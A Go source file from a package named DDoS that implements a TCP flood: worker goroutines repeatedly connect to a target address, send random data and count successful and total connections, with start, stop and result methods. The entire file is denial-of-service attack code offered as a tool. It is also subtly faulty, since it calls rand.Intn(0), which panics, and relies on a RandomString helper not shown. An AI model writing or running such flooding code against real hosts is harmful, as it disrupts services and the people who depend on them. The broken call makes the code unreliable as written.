package DDoS

import (
	"fmt"
	"net"
	"runtime"

	"math/rand"
	"sync/atomic"
)

// TCPFlood ...
type TCPFlood struct {
	ID            int
	Target        string
	StopProcess   *chan bool
	Workers       int
	SuccessPacket int64
	TotalPacket   int64
}

// NewTCPFlood ...
func NewTCPFlood(targetURL string, workers, QueueID int) (*TCPFlood, error) {
	if workers < 1 {
		return nil, fmt.Errorf("Amount of workers cannot be less 1")
	}

	s := make(chan bool)
	return &TCPFlood{
		ID:            QueueID,
		Target:        targetURL,
		StopProcess:   &s,
		Workers:       workers,
		SuccessPacket: 0,
		TotalPacket:   0,
	}, nil
}

// Run ...
func (t *TCPFlood) Run() {
	for i := 0; i < t.Workers; i++ {
		go func() {
			for {
				select {
				case <-(*t.StopProcess):
					return
				default:
					conn, err := net.Dial("tcp", t.Target)
					atomic.AddInt64(&t.TotalPacket, 1)
					if err == nil {
						atomic.AddInt64(&t.SuccessPacket, 1)
						fmt.Fprintf(conn, RandomString(rand.Intn(0)+256, true))
						conn.Close()
					}

				}
				runtime.Gosched()
			}
		}()
	}
}

// Stop ...
func (t *TCPFlood) Stop() {
	for i := 0; i < t.Workers; i++ {
		(*t.StopProcess) <- true
	}
	close(*t.StopProcess)
}

// Result ...
func (t *TCPFlood) Result() (successPacket, totalPacket int64) {
	return t.SuccessPacket, t.TotalPacket
}
